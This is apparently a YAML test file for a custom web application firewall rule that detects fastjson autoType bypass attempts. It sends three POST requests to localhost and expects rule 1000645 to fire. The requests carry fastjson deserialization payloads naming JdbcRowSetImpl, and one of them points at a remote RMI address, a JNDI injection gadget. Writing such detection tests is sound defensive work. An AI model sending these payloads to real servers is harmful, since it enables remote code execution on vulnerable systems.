---
meta:
  author: "JiuZhang CUSTOM_PACK"
  description: "fastjson autoType bypass L...; / [...] class notation (1000645)"
rule_id: 1000645
tests:
  - test_id: 1
    desc: "L...; notation @type payload in form value"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: 'j={"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://10.0.0.1/x","autoCommit":true}'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1000645]
  - test_id: 2
    desc: "[... array notation @type payload in form value"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: 'j={"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"@type":"java.util.Properties"}]}'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1000645]
  - test_id: 3
    desc: "L...; notation as JSON-parsed arg value"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;"}'
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1000645]
